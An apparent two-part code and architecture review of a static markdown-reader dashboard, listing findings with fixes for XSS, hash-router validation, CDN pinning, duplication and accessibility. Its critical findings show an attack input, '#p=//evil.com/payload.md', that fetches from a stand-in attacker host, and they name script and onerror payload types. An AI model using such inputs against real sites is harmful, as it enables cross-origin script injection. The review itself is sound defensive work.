# Phase 1: Code Quality & Architecture Review

## Code Quality Findings

### Critical

**C1. XSS via unsanitized markdown rendering** — `index.html:441`
`content.innerHTML = marked.parse(text)` — marked does not sanitize by default. Raw `<script>`, `<img onerror=...>`, or `<iframe>` tags in any fetched markdown file will execute. Error path at line 465 also interpolates `err.message` into innerHTML.
Fix: Add DOMPurify — `content.innerHTML = DOMPurify.sanitize(marked.parse(text))`.

**C2. Path traversal / open redirect in hash router** — `index.html:471-474`
`hash.substring(3)` is passed straight to `fetch()`. `#p=//evil.com/payload.md` fetches a remote document via a protocol-relative URL. Combined with C1 = arbitrary-origin XSS.
Fix: Whitelist — `if (!/^[a-z0-9._/-]+\.md$/i.test(path) || path.includes('..') || path.startsWith('/')) return showNotFound()`.

### High

**H1. `loadPage` has ~6 responsibilities** — `index.html:429-469`
Mixes view toggling, focus, scroll, skeleton, fetch, parse, link rewriting, materials-panel post-processing, error rendering, and aria state. Cognitive complexity mid-teens.
Fix: Extract `rewriteInternalLinks()`, `decorateSessionMaterials()`, `setView()`, `renderError()`.

**H2. Massive HTML duplication for asset rows** — `index.html:295-356`
Two meeting cards are near-identical (~40 lines each). Every new meeting requires hand-editing both URLs in two places — an obvious source of broken-link bugs.
Fix: Render from a JS data array; or at minimum extract the download icon SVG into a `<symbol>` to eliminate the 8 duplicated SVG blocks.

**H3. Path resolution is brittle and origin-coupled** — `index.html:446-448`
`window.location.origin + '/' + baseDir` breaks on GitHub Pages project sites (served from a subdirectory). Works by coincidence on the current deploy.
Fix: Resolve against `document.baseURI` — `new URL(href, new URL(path, document.baseURI)).pathname`.

**H4. All fetch failures map to one indistinguishable error** — `index.html:464-466`
404, network down, CORS, parse error all show identical "File not found". The `throw` string at line 439 is hardcoded.
Fix: Differentiate — `response.status === 404 ? 'Page not found' : \`Server returned ${response.status}\``. Log original error.

### Medium

**M1. Tailwind CDN in production** — `index.html:26`
Explicitly unsupported by Tailwind. Ships ~300KB JIT compiler client-side, prints console warning, is a third-party runtime dependency.

**M2. Tailwind config defined before CDN load — order-fragile** — `index.html:7-26`
Works by script-tag order coupling. A future defer/preconnect change silently breaks all color tokens.

**M3. Color palette duplicated: Tailwind config + CSS vars + inline rgba** — `index.html:11-20, 33-43, passim`
Three styling systems coexist. Add a color, forget one place, dashboard and reader drift. `--wash-N` tokens are a partial fix; inline `rgba(43,108,176,0.06)` variants remain.

**M4. `renderFileTree` not idempotent** — `index.html:415-427`
If `loadPage` is called twice on cached content, connectors prepend twice. Safe now because `innerHTML` is blown away each call, but makes no contract.
Fix: Guard with `ul.dataset.treeRendered`.

**M5. `handleRoute` does not validate empty hash path** — `index.html:471-480`
`#p=` (empty) calls `loadPage('')`, fetches `index.html` itself, runs `marked.parse` on raw HTML.
Fix: `hash.length > 3` check plus the C2 whitelist.

**M6. Reader view leaves stale content on back-nav** — `index.html:471-479`
`content.innerHTML` holds the previous page's DOM (including any iframes/video) when hidden.
Fix: `content.innerHTML = ''` on dashboard nav.

**M7. No Escape key handler to exit reader**
Standard modal UX. ~5 lines to implement.

### Low

**L1. `aria-live` on the full article container** — `index.html:400`
Screen readers announce the entire parsed markdown body on every load. Should be on a small `<div role="status">` status region only.

**L2. `target="_blank"` missing `rel="noreferrer"`** — `index.html:314, 346`
`noopener` present, `noreferrer` missing.

**L3. Magic text-size and tracking values repeated throughout**
`text-[10px]`, `tracking-[0.35em]` etc. appear dozens of times — named utility classes or CSS tokens would centralize them.

**L4. `marked.setOptions({ breaks: true })` is opinionated** — `index.html:413`
Turns every newline into `<br>` — likely wrong for hand-edited prose markdown.

**L5. Office viewer URLs hardcode repo + `master` branch** — `index.html:314, 346`
If repo is renamed, forked, or branch renamed to `main`, every slide link breaks silently.
Fix: Define `const REPO_BASE = '...'` in one place.

**L6. Footer renders in reader view**
Appears orphaned below long markdown articles.

**L7. `will-change: transform` on every card unconditionally** — `index.html:101`
Forces compositor layer allocation on all cards. Remove it; modern browsers handle transforms without the hint.

**L8. No meta description or Open Graph tags**

---

## Architecture Findings

### Critical

**A-1.1. Meeting list duplicated as hand-written HTML**
Archive cards (lines 295–356), Next Session card (243–283), and Knowledge Base tiles are all hand-written HTML repeating identical structure per meeting. Content is data; it is embedded as presentation. Two sources of truth: `meetings/` directories vs. hardcoded HTML. They will drift.
Fix: Introduce a meeting manifest (`meetings/index.json` or `window.MEETINGS = [...]`), render cards from it.

### High

**A-2.1. Tailwind CDN in production** (see M1 — same finding, architectural impact)

**A-2.2. No subresource integrity or version pinning**
`cdn.tailwindcss.com` and `cdn.jsdelivr.net/npm/marked/marked.min.js` — no version pins, no SRI hashes. CDN compromise = arbitrary code execution on every visitor.
Fix: Pin versions and add `integrity="sha384-..."` + `crossorigin="anonymous"`, or vendor locally.

**A-3.1. Hash router does not validate paths** (see C1/C2 — same security surface)

**A-3.2. Link rewriting correct by coincidence on GitHub Pages** (see H3)

**A-4.1. No content schema / filesystem-as-database**
Content model is implicit: directory structure + README naming convention, with no schema, no validation. "Upcoming Materials" placeholders are static HTML — they don't reflect files that may already exist on disk.
Fix: Per-meeting `meeting.json` manifest.

**A-5.1. No rendering primitive — central architectural gap**
No component/template pattern. Each card is bespoke hand-built HTML. As the 4th/5th meeting lands, this becomes the primary maintenance burden.

**A-7.1. O(N) editing cost per new meeting**
Adding meeting-02: edit index.html, move ~25 lines, author ~40 lines of new markup, check paths. With a manifest this becomes: add one JSON entry.

### Medium

**A-1.2. No View abstraction**
View-switching is an implicit `if (hash.startsWith('#p='))`. Adding a third view means growing the conditional. A minimal route table would decouple this.

**A-1.3. `loadPage` mixes four concerns** (see H1)

**A-2.4. No automated link-integrity check**
Renaming any markdown file silently breaks dashboard links. No test to catch it.
Fix: `check-links.sh` that greps `#p=` and `href="meetings/"` paths and verifies existence.

**A-3.3. No real 404 / unknown-route handling** (see H4)

**A-4.2. Session Materials tree relies on heading-text matching**
`/session materials/i` regex on rendered `<h2>` text is a fragile contract. Author typos break styling silently.
Fix: Use a markdown fenced block (`\`\`\`tree`) or HTML comment marker instead.

**A-5.4. Color tokens duplicated three ways** (see M3)

**A-6.3. `meeting-99-new` conflates template and data directory**
"Inbox" tile points to `meetings/meeting-99-new/README.md`. A real meeting numbered 99 collides. The `templates/` directory exists but is unused for this purpose.
Fix: Move to `templates/meeting-template/`.

**A-7.2. No pagination/grouping for archive**
`grid-cols-1 md:grid-cols-2` — at 10+ meetings this becomes a long scroll; at 30+ it is unusable.

### Low

**A-3.4. Back-button + scrollTo race** — `window.scrollTo(0,0)` fires before fetch resolves; flash of scroll-top.
**A-4.3. Office viewer URLs hardcode repo + `master`** (see L5)
**A-5.2. No module/IIFE — everything is `window`-global** — `<script type="module">` or IIFE
**A-6.2. Inconsistent naming conventions** — `meeting-00` vs `meeting-99-new`; mixed file case; mixed CSS class conventions
**A-7.3. No markdown caching** — `fetch` on every nav; `Map<path,text>` would make back-nav instant
**A-7.4. No hover-prefetch of next page**

---

## Critical Issues for Phase 2 Context

These findings from Phase 1 should directly inform the security and performance review:

1. **XSS sink at `content.innerHTML = marked.parse(text)`** (C1) — security review should confirm attack surface and whether `marked` v12 sanitizes by default.
2. **Open redirect / path traversal via unvalidated hash** (C2 / A-3.1) — security review should assess SSRF and CORS bypass feasibility on GitHub Pages.
3. **No SRI on CDN scripts** (A-2.2) — supply chain risk; security review should assess.
4. **Tailwind CDN JIT compiler running client-side** (M1 / A-2.1) — performance review should measure first-paint cost.
5. **All fetch failures have same error message** — no logging; security review should consider whether error messages leak path information.
6. **`will-change` on all cards unconditionally** (L7) — performance review should assess compositor layer cost.
